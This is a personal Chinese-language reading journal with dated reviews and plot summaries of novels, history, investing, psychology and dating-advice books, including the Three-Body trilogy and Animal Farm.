《百年孤独》它是魔幻现实主义文学的代表作，印象最深的是一场雨下了四年十一个月零两天，据说是《圣经·创世纪》中有关洪水浩劫及诺亚方舟等故事的移植。书中讲述的是布恩迪亚家族七代人的百年历史，这百年的家族历史，也是映射出了南美洲的百年历史，有欧洲人，其他各地区人口的移民，有各种新技术的引入，带来繁荣并没能持续，里面也包含了内战，映射的应该是哥伦比亚的内战，对内战了解不多，抛开这些，其实读完后最直观的感觉是这是一个乱伦的历史（当然甚至都不用读完就能感受到了）。现在我们知道近亲结婚很大概率生出有缺陷的孩子，在书中是把这个当做了一种诅咒，而诅咒的结果是会生出长有猪尾巴的孩子。第一代何塞·阿尔卡迪奥·布恩迪亚和乌尔苏拉是近亲结婚，到第7代在危险的边缘（各种乱伦）疯狂试探后，终究是生出了长有猪尾巴的孩子，这是百年家族的终结。书本的人物的命名基本较长，每一代基本取父辈或者爷爷辈的人的名字中的一部分，或者在名字后面加个第二，这样的安排是他们命运的类似，命运的轮回，孤独的轮回。对于里面所表达出的孤独，不同的人有不懂的理解，有不断重复与轮回的枯燥与孤独，有缺少爱的孤独。其实人生来就是孤独的，很多东西，我们都得独自面对，也必须有能力面对，不然迟早被打垮。——20200816 《枪炮、病菌与钢铁：人类社会的命运》距离《百年孤独》读完已经近一个月了才把这本书读完，这本书页数也算比较多，由于很多东西需要思考，地理位置需要百度一下，看得也慢，很多时候还拖延，懒得看，所以看书效率疯狂降低。作者贾雷德·戴蒙德是一名演化生物学家，看完这本书会给你打开一个全新的世界，你会发现原来环境如此重要，地理位置与气候如此重要，交流如此重要，之后你便可以回答为什么是欧亚大陆人去征服、赶走或者杀死印第安人、澳大利亚人和非洲人，而不是反过来呢？现在我们知道人类起源于非洲，这是一种先发优势，为什么没能保持呢？一开始大家都是采集狩猎，也没有谁比谁高级多少，基本谁都要去采集狩猎，其实那时候才是最公平的时候，不管你是谁，你都得去采集狩猎。那后来拉开差距的是对野生动植物的早期驯化，逐步过渡到农业社会，这才使驯化出动植物的族群具有领先优势。在新月沃地区(西亚、北非地区两河流域及附近一连串肥沃的土地）率先驯化出了大麦、小麦和各种豆荚，动物的话主要是牛和羊了，而我们中国就是驯化出了水稻。古人的这种驯化可能是无意识的，就是看到一些果实比较多，饱满，啥的东西就摘，之后可能掉落了种子，就在地上长起来了，那么就不断选择最好地留下来，那么就渐渐地驯化了。而且其他地区美洲、非洲、澳大利亚它们可供驯化的植物就少，就没有欧亚大陆的那些植物，而且当地的植物可能就驯化不了，而动物的话非洲虽然动物多，但是并不适合驯化，作者说假如把斑马给驯化了，可能非洲真可能反过来征服欧亚大陆，美洲和澳大利亚的动物在人类迁徙到这之后就导致很多大型的哺乳动物都灭绝了，可能是因为狩猎的缘故吧，动物都没多少了，哪来的驯化。还是一点是地理原因，欧亚大陆是东西向的，而美洲、非洲都是南北向，这样在欧亚大陆某个地方驯化的动植物很容易传播到在同一纬度的其他地方，而且东西方向没有太多阻隔，从欧洲到印度，除了喜马拉雅山脉和青藏高原，而非洲被大沙漠被分开了，美洲现今巴拿马运河那里中间窄，不利于南北交流，而且南北走向的气候相差甚远，这边的植物肯定不适应那边的气候。有了驯化的动植物，尤其是牛拉犁提升了耕作效率，这样就可以养活更多的人，有些人就可以干政治，记录，发明创造等工作，更多的人就催生了更复杂的社会，从部落，再到帝国，最后到国家。经过不断地发展，欧亚大陆的领先优势越来越明显，由于驯化了动物，长期近距离接触动物，导致病菌也传到了人类，欧亚大陆幸存下来的人就有了免疫能力，最终欧亚大陆发展出了枪炮，病菌与钢铁，彻底打垮美洲、非洲和澳大利亚。最后作者还谈到新月沃在驯化动植物具有先发优势，后来怎么不行了？因为那里的植被自我修复能力弱，都沙漠化了，还怎么种植，怎么发展。还有就是中国近代为啥也不行了，中国也有驯化动植物的先发优势，古代的四大发明也是我们这发明的，作者认为是中国一开始便是统一的国家，由于南北除了江河没有太大的障碍，一个人或者一波人的决策就可能改变历史，比如郑和下西洋，后来就被禁止派给胜利禁止了，造船厂都没了，后来还怎么发展，还有就是现代的文革，可能一个人的错误就发动了这个东西，而欧洲长期都是分裂的，英国是被海峡分割，而欧洲也有各种山，半岛分割，所以哥伦布求赞助的话，可以向多个国家求助，总会有一个国家冒险赞助，一旦这个东西有利可图，其他国家的赞助不就跟上了。所以环境和初始所拥有的东西以及交流很重要啊。——20200914 《苏世民：我的经验与教训》这本书一上来就各种中美各种CEO，财政官员的推荐语，包括马云，马化腾，李彦宏，张一鸣等，还有什么前财政部长什么的，反正会令你震惊，从这也可以看出作者与大佬们的关系也是不一般的。在初高中都是当学生会主席，那时就把一些看来不太可能的事情做到了，比如请小安东尼和帝国乐队来学校的体育馆表演，他打了很多个电话，动用了很多同学家人的关系。他要做就做大目标，因为他认为大目标和小目标花费精力一样多，不如直接定个大目标。这个我当然不认同了，大目标可以拆分为很多小目标，逐个完成，还是相当费精力的。读完感觉他是一个很强势的人，一心想去哈佛而不是耶鲁，哈佛不要他，就找到哈佛大学负责招生的院长的电话，并尝试说服哈佛录取他，当然最终没成功了，通过田径而拿到到的耶鲁大学那也是非常不错的。从0在雷曼兄弟干到合伙人，能力确实非常出众，后来创立黑石，起步真的相当困难，当然后来慢慢走上了正轨，到后面令我印象最深刻的是在房地产的投资，在金融危机前的一些操作，2006年秋天，在讨论收购西班牙几个街区的公寓时，那边的公寓已经严重过剩，第二点是有个同事说印度土地的价格在18个月内增长了10倍，他感觉这就是个泡沫，现在是全球化，应该基本同步的，所以否决了这个收购。然而在06年10月份，黑石的首位投资人萨姆·泽尔考虑出售他的公司——EOP（Equity Office Properties）公司，搜了下是现在美国最大的办公物业公司。萨姆希望在市场触顶的时候退出房地产行业，而他觉得现在是时候出售了，那很可能房地产的至暗时刻将至，所以苏世民他们觉得在交易中获利的唯一方法就是在我们预期的崩盘来临前，把萨姆的公司拆分出售，所以收购后马上就卖出，只留最核心，地段最好的房产，极大地降低了剩余房产的每平米的成本，这个预判和执行力真的很强。在危机来临的时候跟财政部长和总统积极沟通，也为解决危机出了一份力。到了后来11年开始筹办清华大学苏世民学院，也是通过这个项目认识认识了很多中国的大佬CEO们。在投资上曾经一次的一言堂导致的亏损，到后来设计了一套制度的群策群力，避免了很多高风险投资。在人才上，必须有10分人才才去开拓新业务，得8分的人是任务执行者，得9分的人非常擅长执行和制订一流策略。如果公司都是9分人才，就可以获得成功。但10分人才，无须得到指令，就能主动发现问题、设计解决方案，并将业务推向新的方向。——20200922 《随机漫步的傻瓜》读完后感觉作者还是一个偏极端的人，把世界各种东西都随机化了，哪怕是比尔盖茨也说成就是运气，当然这与运气，或者说概率是有关系，他得出生在那个家庭，之后大学刚好到了计算机的时代，而且他本身也是很聪明的，很多种因素才能成就现在微软的商业帝国。除了极端一点，还是有干货，有收获的。专家推荐那几页，总结巴菲特的成功秘诀总结得不错，归纳为两个基本点，一个是成大功，二是避大险，投资是长跑，比赛结束才见分晓，避大险很重要，不然直接就没了比赛资格，相当于直接认输了。作者首先一上来先来了一个偏态的概念：如果失败的代价过于沉重、难以承受，那么这件事成功的概率有多高根本无关紧要。这个确实是的，无论失败的概率有多低，只要次数足够多，它总会出现，成为黑天鹅事件，这也会让我们想起墨菲定律：凡是可能出错的事就一定会出错。由于幸存者偏差，我们认为的投资大师，可能完全是因为运气好而已，那么最终凭运气挣的钱 可能就会凭实力亏回去。很多时候，消息、财经评论等都只是杂音，会影响我们的判断，很容易导致亏钱，解决方案就是减少信息的来源。里面还说了一些科学家，甚至是研究概率的，有时候也会犯错，尤其还去赌博，把概率抛之脑后。还有一些人是对概率的认识不深刻，把普通的概率和条件概率混淆了，比如这个病5年生存概率50%，假如得这个病的人已经活了5年了，他这时生存的概率肯定不是50%了，前50%的坑位已经有人填了。作者做了一个蒙特卡罗模拟，来说明判断历史事件时，时间尺度很重要，比如投资的年预期收益15%，波动性10%，计算后任何一年挣钱的概率为93%，但是从比较窄的是尺度看，任意一秒挣钱的概率是50.02%，一分钟50.17%，一个小时是51.3，一天是54%，一个月是67%，一个季度是77%，所以做短线是比较难挣钱的，这也说明了低位重仓买入好公司长期持有的重要性了。——20200929 《了不起的我：自我发展的心理学》这本书读完没有马上写总结，写感受，导致现在真的记不起什么东西，只能去搜索，再看看目录啥的了。这本书看着是作者直接从得到APP里的课程copy出来的，因为每小节就是一课。里面没有太多的鸡汤，基本说了大概要怎么做，有什么方法。最开始说了改变为什么难（我们每个人都有两个自我：感性的自我，理性的自我，虽然理性自我可能是为了我们好，但是我们偏向于选择感性自我，因为它偏向于经验的好处），所以改变的本质是就是创造新经验，用新经验来代替旧经验的过程。而创造新经验需要通过新的行为，获得新的反馈，新的强化，并亲身感受到它。里面有一个好的比喻，感性自我是大象，理性自我是骑象人，骑象人可能很难控制大象，需要我们一步一步改变，让大象觉得新经验更好，改变就慢慢发生了。那怎么做出改变，首先要明确我们无论如何都是可以选择改变的，如果自己都觉得不可能，那怎么开始改变呢？心理舒适区可能是改变路上的拦路虎，它除了指在安逸的环境中待久了，还指人们对环境的熟悉感和适应感，即使我们处于非常痛苦的环境中，时间久了，我们会适应这样的痛苦，痛苦于我们而言变成了熟悉的事，我们的心理也会不愿改变。最后我们需要的是行动，我们常常认为是我们懒惰，拖延，但可能深层次的原因是恐惧——没有开始就已经害怕失败，不改变就不会失败，所以我们要找到恐惧的来源，克服恐惧。作者给了“X光片”来看清心中的恐惧：1、改变的目标2、正在做什么与目标相反的行为3、这些相反行为背后的好处4、让这些好处成立的重大假设。后来还有一个场的概念，它是指包含大量行为线索的环境，这些行为线索能激发特定的行为。我们在办公室、图书馆、自习室的工作学习效率会很高，这是场的力量，旁边的人都在学习工作，面前的东西都是学习工作相关的东西，就会激发咱们学习工作的行为，但是在家里，左边游戏机，右边是ipad，前面是电脑，这明显都是娱乐相关的东西，这肯定难以让我们静下心来学习啊，所以即使在家学习工作，肯定需要把某个空间打造成学习工作的环境，让场的力量助我们一臂之力。接下来说的各种不好的思维已经忘了差不多了，就回顾一下里面的僵固型思维，它是指把注意力从挑战任务本身，转移到对自我的关注上面来。比如夸孩子“努力”比“聪明”更重要，假如夸聪明，他们可能会努力维护聪明的形象。最后印象比较深刻的是战胜拖延症的一个工具，叫执行意图，我们用一个条件语句——“如果……就……”，比如我们想吃完饭看书，不断地跟自己说：“如果我吃完饭，我就会翻开书看几页”，后来作者更进一步介绍了WOOP思维，W是Wish(愿望)，O一个是Outcome(结果)，另一个O是Obstacle(障碍)，P是Plan，最后的这个Plan就是用“如果……就……”这个格式写的plan。前面3个就是仰望星空，后面的Plan让我们脚踏实地。——20201122 《流浪地球》这本书的同名电影大家应该都很熟悉了，这是一部中短篇科幻小说，所以很快就看完了，其实实体书好像是属于少年科幻科学小说系列，但是我觉得成年人看也完全没问题，还挺好看的。在里面的任务跟电影里面还是很大差别的，主人公在一次滑雪比赛遇到一个日本女子，没记错的话确实是日本的，叫加代子，由于她的滑雪板坏了，所以他们一起划到终点，最后到终点就领证了，真是随意。小说分为4部分：刹车时代、逃逸时代、叛乱、流浪时代，电影没记错的话只是展现了逃逸时代，但是小说中的叛乱章节更让我感兴趣，由于惧怕太阳氦闪爆发引起的灾难，咱们才给地球装上发动机，在宇宙中流浪，所以核心的点是氦闪爆发，假如这个事情不存在，地球流浪就是一个骗局。在离开木星后，人们可能没啥危机感恐惧感，没啥可干，很多人用更大型更精密的仪器观测太阳，发现太阳没啥变化，甚至一个民间组织向太阳发射了一组探测器，发现太阳跟四个世纪前相比没有任何变化，就凭这把科学家们的结论给“推翻”了，当然相信的人越来越多，包括主人公的妻子，相信的人都加入了叛军，推翻联合政府，想要控制地球发动机，回到太阳系，回到原来的位置。叛军竟然获得了胜利，最终来到了地球发动机控制室，将里面的5000人处以死刑，把密封服的核能电池收走，那么他们都被冻死了，就在他们刚冻死没多久，太阳氦闪就爆发了，这是多么戏剧性，这或许就是人性，咱们绝大多数人很容易就相信阴谋论。——20201201 《三体1》第一部赶在2020年最后一天压轴完成了，作者对于科幻小说的功能并不是预测未来，只是把未来的各种可能性排列出来，让人们欣赏和把玩。在这无数的可能的未来，作者认为没有太空航行的未来都是暗淡的，所以作者觉得冷战时期的太空竞赛才是正轨，当今发展迅速的互联网把我们引向了错误的方向，减慢了咱们进军太空的进程。第一部采用的是倒叙的叙述方法，上来就说多个科学家自杀，看得有点懵，后来感觉汪淼也要经历相同的命运，当然内心是不希望的。最坑的是之前隔了一段时间看，忘记了一些剧情，搜索了下，结果被动地被剧透了，叶文洁竟然是大反派？还害死了自己的女儿，真的狠。在书里，主人公汪淼疯狂地玩《三体》这个名字的游戏（在三体里面玩三体这个游戏），让咱们从游戏中了解三体人所面对的恶劣环境，以及展现了他们的一些特点，在游戏里面印象比较深刻的是作者在游戏里面描写人肉计算机，当然里面的用词是人列计算机，假如我们人类用这个方法肯定比单个人单独运算还要慢，据说三体人可以直接通过思维交流，导致这个效率比个体的效率要高。还有就是里面还有科学家研究三体问题，这是天体力学中的基本力学模型，它是指三个质量、初始位置和初始速度都是任意的可视为质点的天体，在相互之间万有引力的作用下的运动规律问题，假如有解，三体人就能预测未来，但是就现在已知的情况是不能精确求解的，而这个三体问题也是这本小说以此基础创作的，所以从这两个事情看作者有较为丰富的计算机与物理知识。小说大概说的是之前我国的一个秘密研究项目，一个功能是探索是否有人类以外的文明并尝试与其联系，这样谁领先可能就在国际竞争中占据领先地位，而叶文洁通过太阳的能量镜面增益反射，即太阳是一个电波放大器，所以通过向太阳发射电波，太阳反射之后的功率是恒星级别的，比地球上能够使用的全部发射功率还要大上亿倍，这样就能传得更远了，外星文明就可能听到。当然三体人就听到了，并有所回复。后来叶文洁对伊文斯说了这事，而伊文斯慢慢地对人类不满，后来就发展出了地球三体组织，宗旨从“借助外来力量拯救腐朽的人类社会”，到后期转变为“灭绝人类”，希望三体文明接管地球。但这又分为3派，分别是降临派，拯救派和幸存派，降临派与拯救派的不同就是一个是灭绝人类，另一个是借助外力拯救人类，而最后一个是后来发展出来的，就是在以后人类与三体人的战争中生存下来。最后在一次线下聚会中，叶文洁被捕，询问了很多事情，之后通过高科技把伊文斯干掉，拿到了他与三体文明的所有通讯内容，也知道了为啥汪淼的眼前为什么会出现倒计时，是三体制造出的智子（质子经过二维展开改造后的智能微观粒子，可以进行通讯、侦查、干扰粒子高能加速器[阻止人类的底层科学的进步]等任务）搞的鬼，所以智子还可以实时监控人类，而且三体人把人类称为虫子，知道真相的汪淼和丁仪都快绝望了，被大史用我们人类从没有战胜过虫子这个例子，让他们俩又重拾了信心。——20201231 《三体2：黑暗森林》第二部比第一部要长，加上懒惰，所以读完耗费了不少时间。通过第一部拿到伊文斯与三体的通讯内容，人类知道三体人的思维是透明的，相当于他们之间能直接读心，所以他们之间没有隐瞒和欺骗。由于智子可以听懂人的语言，读取任何书籍和计算机存储信息等，地球对于三体没有任何秘密可言，但智子却无法监视到人的思维。针对这一弱点，人类抛出了“面壁者计划”（他们完全依靠自已的思维制定战略计划，不与外界进行任何形式的交流，计划的真实战略思想、完成的步骤和最后目的都只藏在他们的大脑中），选出了4位面壁者，而ETO(地球三体组织)就相对应地推出了破壁着计划，选出了3位破壁者，而针对面壁者罗辑的破壁者是三体。面壁者泰勒真实意图利用球状闪电攻击人类舰队，使其成为量子幽灵舰队来对抗三体，但三体并不在乎，最终受不了破壁而自杀，这也证明了他这意图是真实的。第二个面壁者雷迪亚兹想在水星地下引爆大量氢弹，从而减速水星使其坠入太阳，造成连锁反应使金星、地球、火星、木星全部坠入太阳，这计划就是自杀性的，自己假如活不了，三体也不能得到地球，由于被破壁，回到国内被愤怒的民众用石头砸死了。第三个面壁者是希恩斯，想利用思想钢印想人类植入失败主义，让人类逃离太阳系以避免与三体人正面接触与冲突。这三个面壁者感觉都太消极了，都是干着对人类有害的事情。第四个面壁者是罗辑，他是中国人类社会学博士，一开始只是享乐，到后面通过叶文洁留给他的提示，悟出了黑暗森林法则，在冬眠之前发出了咒语进行验证，后来确实证实了。在罗辑冬眠醒来后，发现以前有一个叫大低谷的时期，是由于对太空防御投入太多，导致人们生活质量越来越差，甚至出现饿死人和人吃人的现象，后来限制太空投入，人们都吃饱喝足，才有精力搞研究啊，之后科技很多也都突破了，飞船的速度都可以达到光速的15%了，但是后面面对三体的一个探测器，里面把这个探测器叫做水滴，它是一个便面无比光滑，用电子显微镜放大百万倍也是光滑的东西，它是由强相互作用力材料（SIM），所以异常坚固，只需撞击人类战舰的燃料舱，从而导致核燃料聚变而爆炸，类似一个个小太阳，人类完败，之后水滴一开始应该是想直接杀掉罗辑，但是那时人类已经知道罗辑冬眠前的咒语生效了，所以水滴改变了方向，开始对太阳的电波放大功能进行了全频段压制。由于，所以恢复了面壁者计划，他成了唯一的面壁者，后来利用雪地工程做掩护，在上面利用恒星级氢弹建立黑暗森林威胁，这个工程所建立的恒星级氢弹可以将海王星的油膜物质变成太空尘埃，而产生特定尘埃云遮挡住了太阳，在宇宙方向观察，被遮挡的太阳会在可见光和其它电磁波段形成闪烁，闪烁包含的信息就是三体坐标，从而向宇宙标注了三体的位置。最后罗辑戴着恒星级氢弹的开关——生命体征检测仪，举起手枪对准自己的心脏与三体进行谈判，建立了黑暗森林威胁。——20210124 《战胜华尔街》作者彼得•林奇是一个乐观主义者，一个高效的勤奋者，所以他能够在经济不好的时候逆势抄底，或者公司跌破了价值的时候能够坚定地买入，再加上组合持仓，让他能够战胜华尔街。作者是一个比较激进的人，他认为那些偏爱债券的投资人，他们错过了投资股票的巨大财富，但是我觉得股票是一个合法的赌场，我们都在赌股票会涨，当我们卖的时候就相当于赌它不会再涨了，而且根据统计股票大致是一个一赚二平七亏的游戏，所以大部分人都是亏钱的，不挣不亏已经战胜了市场的绝大多数人。林奇偏向于投资公司业务简单的公司，能够用蜡笔进行描述。虽然林奇会买入很多股票，比如在1983年投资组合有900只股票，但是其中有700只股票加起来不到基金总资产的10%，后面的股票对于基金净值影响不大，但是这能够让林奇关注他们，或许什么时候后面的股票就产生了绝佳的投资机会了。其实还有一个咱们普通人不能比的，就是林奇能够与上市公司的高管或者相关人士交流，收到消息就比咱们快不知道多少倍，还有公司内有很多其他基金经理，可以互相提示风险，这其实也帮了林奇不少。此外林奇很关注公司的基本面，财务相关的东西，为了发掘好的公司，林奇平均一年要走访500-600家公司，甚至陪家人出国旅游时，妻子去逛景点，他去公司调研。这样的人不战胜华尔街谁战胜华尔街呢？对于每个行业或者股票的类型，林奇都有不同的原则，比如周期股要抓住正确时机及时抛出，一个公司即将灭亡就不要押它能够起死回生了（感觉林奇在书里面也押了。。。），对于零售业的选股，可以边逛街边选股，如果你喜欢上一家上市公司的商店，可能你会喜欢上这家公司的股票。最后林奇对于高估的一个标准是，市盈率不应超过收益增长率，当然这个只是经验，在现在2021年的牛市阶段，很多抱团股都肯定是高估了的，比如茅台。——20210130 《潜规则：中国历史中的真实游戏》这本书当时看的时候还是挺震撼的，对于潜规则，它是中国社会在正式规定的各种制度之外，在种种明文规定的背后，实际存在着一个不成文，但又获得广泛认可的规矩，一种可以称之为内部章程的东西。书本以明清的例子居多，因为距今比较近，史料什么的也比较多。对于人民与官的关系，张居正总结说：人们怕那些吏，一定要贿赂那些吏，并不是指望从他们手里捞点好处，而是怕他们祸害自己。因为合法的祸害别人的能力乃是官吏们的看家本领，这是一门真正的艺术，种种资源和财富正要据此分配并重新调整。比如里面就说了一个叫陈定的富户有一妻一妾，妻妾二人闹气，妻子被气死了，邻里的好事之徒怂恿妻弟去告官，宣称人死得不明不白，要敲陈定一笔。对于地方官，吴思说到：“这状子是可准可不准的；其次，准了之后拿来问讯，对陈定的申辩也是可听可不听的。在这两个具有合法选择空间的关口，那位知县全选择了最具伤害性的一头：立时准状、不由分说。谁也不能说他这样做出了格。”那为何官能合法地祸害呢，主要还是民告官的代价实在太高了，毕竟官可以枪打出头鸟，杀一儆百，其他的平民就只能受剥削了，因为受剥削比被官收拾好多了啊。之后里面从经济角度说了为何在明朝你很难当清官，因为明朝的工资实在是太低了，工资压根就养不活家人，你说这还做什么官，怎么做清官。贪腐有多难治，以朱元璋为例，在平定中国之后，朱元璋就建立特务网去监督官员，打击并处罚贪官污吏。但是不断地发现，不断处罚，不断地屠杀，还是没完没了。一个很有本事、责任感很强的朱元璋尚且如此，何况是那些在深宫长大的后代皇帝。在朱元璋两个世纪之后，李自成兵临北京，崇祯皇帝上吊写了遗书，他怨恨的并不是李自成，而是不断扩容他的官僚集团。还有就是皇上也是个冤大头，你糊弄了他，占了他便宜，捞了他一把，他照样给你发工资，照样给你印把子，照样提拔你升。所以宰相等一把手就可以通过欺上瞒下来给自己不断获取更多的利益了。这本书由于读完后过了很久了，20210401才把总结给写了，所以就先到这吧——20210206 《恰到好处的恋爱》以前一直没有看这一类的书籍，看了之后还是挺有收货的，还是值得一看。接下来摘录一下书中一些句子。恋爱关系，发展慢了容易无疾而终，发展快了容易因了解而分手，比较适合的是在激情期结束前培养出足够多的感情，然后走进婚姻，这样的恋爱大概会是恰到好处的，而这也是本书探讨的重点。人们看多了小说电影电视里的高富帅白富美，以及浪漫唯美的爱情故事，在看屌丝男白领女，在在七大姑八大姨的撮合下去相亲，也就不那么容易找到感觉，因为感觉的阀值被提高了。对于想要脱单的人而言，有一件很重要的事，就是不要下班后就回家，或周末窝在家里，除非你回家后上交友网站，否则你不太会在家里遇到那个人。而一旦走出家门，不管是聚会健身，参加沙龙，参加交友活动，还是去书店看会书，找个画展溜达一圈，找个人多的咖啡馆坐一会，都会有机会遇到合适的人，又或者你只是好好的把自己打扮一下，出去逛逛街，也会比呆在家里机会更多些。如果分离或者丧失未经哀伤或者哀伤不够充分，也就是悲痛感并未被充分体验与释放，会对一个人产生很大的影响，比如不能听到或者提到这个人，否则马上会难过，为了压抑这份伤痛的感觉，需要耗掉一个人大量的心理能量，这样就容易焦虑，心烦易怒，没有耐心，爱发脾气等，严重可能导致身心疾病。对于当初动了心，投入了较多感情的情感关系，不管是恋爱分手还是离婚，如果是对方主动提出的，对于一个没有做好准备的人来说，往往会经历以下几个阶段，第1个是否定，不相信对方会离开自己，这是一种防御，第2个是愤怒，第3个是在努力，想要通过自己的努力去挽回，这样就不用承受分手之痛，但是不是所有的感情都能挽回。第4个是哀伤期，努力无果后会进入真正的哀伤期，这时人最大的感受就是伤心。第5个是接受期，哀伤过后情绪平静，会接受已经分开的这个事实，分手的心理过程，真正完成。我们害怕找到的并不是最好的。因为无论爱上谁，都存在着对方满足了你部分需求的原因，也许是性的需要，生存的需要，安全感的需要，也许是被尊重的需要，被爱的需要，归属的需要等，这些需求渴望通过对方来实现，这本身就是爱情里的重要成分。但是就像吃饱了就不饿一样，当两个人一起生活久了，一些需求被满足了，这些需求就会消失，这时人就会产生新的需求，而这些新的需求眼前的爱人不一定能够满足，但爱人之外的人中一定会有人可以满足于，是更好的人就产生了。你喜不喜欢对方是最关键的，喜欢了就积极主动，把好感传递给对方，剩下的就是对方的事情了，让对方去考虑去做决定，不喜欢的话对方怎么想都已经不重要了。愿意主动是一种自信，也是相信爱情的产生，除了一见钟情，还有一种叫日久生情。男人如何主动不重要，重要的是主动本身，或者说男人追女人，各种方法都可能有效，关键是去追，重要是有勇气主动表白，主动约，在拒绝之后继续坚持。女人本能的鉴别男人的方法非常简单，就是拒绝你之后还追，说明诚意多些，在乎多些，再拒绝又在追成一更多在乎更多些。女人的主动就是就像拿一把绿绿肥肥的草，走到羊的面前晃一晃，当然看到羊走过来想吃就后退，就这样一点点前进一点点后退，最后退到羊圈里面，把青草放在地上，自己出来把羊圈的门关上，任务完成。这就是即便是女人自己主动，也能让男人感觉是他们努力追到的。三个搭讪原则，第1个是要第一时间开口。只要是第一时间开口说话，对方潜意识里会认为你本来就是一个开朗热情，愿意跟人沟通的人。如果不是第一时间说话，而是过了一段时间在说对方很容易认为你并不是一个开朗的人，跟他说话可能有某种目的戒备心，使对方不愿意与你有更多的沟通。第2个原则就是以第三方事物为共同话题。共同话题就是两个人都有关，陌生的两个人说这个话题不会觉得突兀，而是觉得很自然，一般都是彼此都可能会关注到的人事物，比如说，对方拿了一本书，这是某某方面的书，对方拿了新款的手机，这是最新款的某某手机吗？第3个原则就是问最容易回答的问题。比如这是某品牌的最新款吗？这是某某写的书吗？对方的回答只需是或不是。在择偶标准上，我们要放弃一些无效的标准。比如有个三岁的女孩，她要找个比年龄比她大5岁的男性，理由是她喜欢成熟的，但是38岁不一定比三岁更成熟，这就是一个无效的标准。人一生中可能遇到的女性是有限的，尤其是深入了解或者较为深入了解的女性。所以我们需要尽可能的认识，更多的女生，从中择优选择。在以后的相亲约会中，为了避免过早，男人很有必要给自己立一个规矩，见面前三次最好连女人的手都不要碰。三次约会以后可以在过马路，爬山，看电影等合适的机会，先适当的触碰女人的手或手臂，女人不排斥的话再开始拉手，给女人一个事先做准备的过程。一旦女人拒绝就不要强来退回到较为简单的亲密行为，等时机合适再继续。我们应该向智能手机学习爱情保鲜的方法，就是能够不断的去升级自己，完善这里，去成长，去提升自己，就能给自己的爱人带来欣喜，使对方不用看人就能满足新的需求，从而会有爱情保鲜。结婚必备的7个基础条件，第一，彼此了解对方的过去，第二，彼此在空间时间上是透明的，第三，彼此在经济上是透明的，第四，是欣赏和尊重的地位，第五，相互获得双方家人的认可，第六，相互在家庭角色的分配上达成一致，第七，想要的未来生活是一致的。真正的爱就是接纳，认可，欣赏，呵护，信任，理解，允许，这些都不是对方给自己的，而是自己心里本来就有的，心中有爱爱情就容易来，爱情也会长久，所以要想找到最好的爱情，相爱住在心中，因为爱人是用来爱的。——20210207 《动物庄园》这是一本具有政治讽刺意味的小说，它反映了1917年俄国革命至踏入斯大林时期的历史事件，通过拟人化各种动物，从一个称为少校的猪提出动物主义，可能是影射共产主义，去追求自由，追求民主，后面动物们就造反了，赶走了农场主，开启了最初一段的美好生活，一些决策也是开会讨论，劳动后分到的食物确实是比之前有农场主的时候要多。之后两只猪——雪球和拿破仑为了最高领导人的地位互相竞争，雪球提出了新建风车，提供电能，这样就可以不用干那么多活，也能提升生活质量，但是拿破仑反对，并通过他从小喂养的狗把雪球给驱逐了，坐稳了领导人位置，这个拿破仑影射的是斯大林，而雪球则是列夫·达维多维奇·托洛茨基。之后慢慢就变味了，革命成果没有均分，而是全部归功于猪，胜利果实全部归猪享有，后面猪逐享有各种特权，而且越来越像农场主的生活看齐，最后猪与人已经没啥区别，而且动物们分到的食物比农场主时代还更少了。——20210219 《三体3》我感觉这最后一部是最精彩的一部了，当然厚度也是最厚的，所以断断续续也看了很久，把前两部一些缺失的故事都补了，比如杨冬的自杀，浅层的原因是智子对于人类科技进步的封锁，从而导致杨冬对物理学绝望，对人类未来绝望，选择了自杀。在危机纪元开始的时候，人类最初计划向三体舰队发射探测器，因为探测器质量较大，改为运送一个人类大脑。之后机缘巧合，将癌症晚期的云天明的大脑发了出去，飞行器偏离既定航线，但后来其实三体舰队成功截获了探测器，还把云天明恢复成人的样子。因为跟水滴大战后逃亡的“青铜时代”号回到了地球，但是这是人类的陷阱，将他们判刑，所以青铜时代”号原目标甄别军官史耐德专注机会向“蓝色空间”号发出了警告，让他们不要回来。从冬眠中苏醒的程心被寄予担任执剑人的期望，为此险遭昔日上司托马斯·维德暗杀。经过与AA和智子的交流，程心决定竞选执剑人，当然也胜利当选了第二任执剑人，深知程心无法胜任执剑人的三体世界立刻发起了对地球黑暗森林威慑系统的打击，当然程心放弃威慑操作。另一边追击“蓝色空间”号的“万有引力”号和水滴，意外遭到“蓝色空间”号从四维展开的伏击，把水滴给消灭了，同时控制了“万有引力”号，降维打击可真可怕。两艘战舰上的成员投票决定，启动引力波广播发送三体星系的坐标，把程心没能干成的事给干了。之后就是三体世界遭到光粒打击，三体行星坠入一颗恒星，三体世界灭亡，其他高级文明发现地球并发起打击也只是时间问题了。程心与罗辑接受了智子的茶道款待，智子在谈话中表明存在向宇宙发布免于黑暗森林打击的安全声明。在三体的帮助下，程心与云天明在地日拉格朗日点通过低维展开的智子实时通信，云天明讲述了《王国的新画师》、《饕餮海》、《深水王子》三个童话故事。这三个故事蕴含了大量有用的信息，尤其是曲率驱动的光速飞船，看完后这是人类唯一的逃亡工具，但程心又搞了一波骚操作，把曲率驱动引擎的研究给干掉了。之后“歌者”文明向地球发送了二向箔武器，能够将太阳系二维化，只有光速才能逃逸。太阳二维化开始后，程心和艾AA把冥王星上一些人类珍贵的文物搬运到星环号上，从而保留地球的部分东西，从罗辑口中得知，星环号搭载着太阳系唯一一个曲率驱动引擎，可以达到光速并逃离二维化。最终程心和艾AA逃离了太阳系的二维化，去了云天明送给她的DX3906恒星系。后面那个DX3906恒星被几艘外星飞船制造了几个内部光速为零的死线。后来云天明也来了，在程心与云天明即将见面时，死线范围扩大到了整个恒星系，但其内的光速由零略增至每秒十几公里，程心和关一帆落入黑域，里面的时间相对外面过得可真慢，他们的时空较正常光速的时空慢上万亿倍。由于等待神经元控制系统的启动，程心和关一帆冬眠了，苏醒后，收到了云天明所留下的由三体世界制造的647号小宇宙的门，他们进入了这个小宇宙。由于数千亿的小宇宙从大宇宙中取走了过多的质量，宇宙停止了坍缩，残存的外星文明发起了回归运动，号召拥有小宇宙的生命体归还质量，程心和关一帆响应了号召，放弃了小宇宙中的物质以回到大宇宙这个险恶的环境。但最终，程心在小宇宙中留下了5公斤重的，鱼缸般的生态球，宇宙的最终命运作者留了悬念。程心是三体3中比较有争议的主角吧，网上对她的评价基本都是圣母婊，其实对于执剑人，三体人都看透了她了，这个是没办法的事情，就算她按下了开关，最终也是跟三体同归于尽，不过话又说回来，没有她这个操作哪来的精彩剧情。到后面阻碍了曲率驱动的飞船的研发这个确实坑，问题是后面研发出来了，还是她享用到了飞船活了下来，这个倒是挺扯淡的。——20210324 